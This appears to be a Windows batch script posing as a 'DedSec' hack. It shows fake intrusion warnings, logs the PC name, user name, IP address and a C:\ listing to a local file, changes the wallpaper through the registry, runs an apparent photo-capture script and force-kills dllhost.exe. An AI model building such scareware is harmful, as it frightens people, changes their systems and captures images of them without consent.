@echo off
REM DedSec - Coletando informações do sistema
title [DEDSEC] Hack In Progress
color 0a
echo [DEDSEC] Initializing...
setlocal

REM Definir o caminho da pasta atual (onde o arquivo .bat está)
set local_folder=%~dp0
set capture_folder=%local_folder%Pasta de captura

REM Iniciar uma animação com GIF da logo da DedSec
start "" "%local_folder%dedsec (1).gif"

REM Criar um script VBS para exibir a mensagem e fechar após 10 segundos
echo Set objShell = CreateObject("WScript.Shell") > "%temp%\timed_msg.vbs"
echo objShell.Popup "Aviso: O sistema esta sendo invadido. Coletando suas informacoes...", 10, "DEDSEC HACKING", 48 >> "%temp%\timed_msg.vbs"

REM Executa o script VBS para exibir a mensagem temporizada
cscript //nologo "%temp%\timed_msg.vbs"

REM Apaga o script temporário
del "%temp%\timed_msg.vbs"

REM Obter informações do sistema
set PCName=%COMPUTERNAME%
set UserName=%USERNAME%
set IPAddress=
for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr "IPv4"') do set IPAddress=%%A

REM Gerar a data e hora atual para um nome de arquivo único
set data=%date:~-4,4%-%date:~-7,2%
set hora=%time:~0,2%-%time:~3,2%-%time:~6,2%
set hora=%hora: =0%

REM Definir o arquivo de log para salvar as informações
set logFile=%local_folder%hacklog_%data%_%hora%.txt

REM Salvar as informações no arquivo de log
echo [DEDSEC] Hack Log >> %logFile%
echo ============================== >> %logFile%
echo PC Name: %PCName% >> %logFile%
echo User Name: %UserName% >> %logFile%
echo IP Address: %IPAddress% >> %logFile%
echo ============================== >> %logFile%

REM Coletar informações do diretório C:
dir C:\ >> %logFile%

REM Alterar o papel de parede
set wallpaper_path=%local_folder%dedsec_wallpaper.jpg

REM Usar o script VBS para mudar o papel de parede
echo Set WshShell = WScript.CreateObject("WScript.Shell") > "%temp%\change_wallpaper.vbs"
echo strWallpaper = "%wallpaper_path%" >> "%temp%\change_wallpaper.vbs"
echo WshShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", strWallpaper >> "%temp%\change_wallpaper.vbs"
echo Set objShell = CreateObject("Shell.Application") >> "%temp%\change_wallpaper.vbs"
echo objShell.MinimizeAll >> "%temp%\change_wallpaper.vbs"
echo WshShell.Run "RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters", 1, True >> "%temp%\change_wallpaper.vbs"

REM Executa o script para mudar o papel de parede
cscript //nologo "%temp%\change_wallpaper.vbs"

REM Executar o script Python para capturar a foto
echo [INFO] Capturando foto...
"%capture_folder%\run_capture.bat"

REM Exibir mensagem final de sucesso com temporizador de 10 segundos
echo Set objShell = CreateObject("WScript.Shell") > "%temp%\timed_msg.vbs"
echo objShell.Popup "Suas informacoes foram capturadas.", 10, "Processo Concluido", 64 >> "%temp%\timed_msg.vbs"
echo objShell.Popup "Muito obrigado pelos dados."

REM Iniciar uma animação com GIF da logo da DedSec
start "" "%local_folder%dedsec.gif"

REM Executa o script VBS para exibir a mensagem temporizada
cscript //nologo "%temp%\timed_msg.vbs"

REM Apaga os scripts temporários
del "%temp%\timed_msg.vbs"
del "%temp%\change_wallpaper.vbs"

REM Tentar fechar a animação (GIF) caso esteja rodando
taskkill /IM dllhost.exe /F 2>nul

echo [DEDSEC] Operacao finalizada com sucesso. Informacoes salvas em %logFile%.
pause

REM Fechar a janela do CMD atual
exit
